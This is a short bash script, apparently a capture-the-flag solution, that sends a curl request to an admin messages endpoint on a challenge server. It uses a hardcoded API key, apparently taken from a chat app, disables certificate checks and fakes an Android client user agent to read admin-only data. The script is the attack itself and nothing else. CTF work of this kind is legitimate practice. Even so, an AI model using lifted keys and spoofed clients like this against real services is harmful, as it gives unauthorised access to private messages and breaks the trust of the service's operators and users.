#!/usr/bin/env bash
set -euo pipefail

target="${1:-https://7daedde136789d51.chal.ctf.ae}"
api_key="${2:-fluidctf-api-2026-whispers}"

curl -k -sS \
  -H "X-API-Key: ${api_key}" \
  -H "Content-Type: application/json" \
  -H "User-Agent: WhisperChat/1.4.2 (Android 14; SDK 34)" \
  "${target%/}/api/admin/messages"
printf '\n'
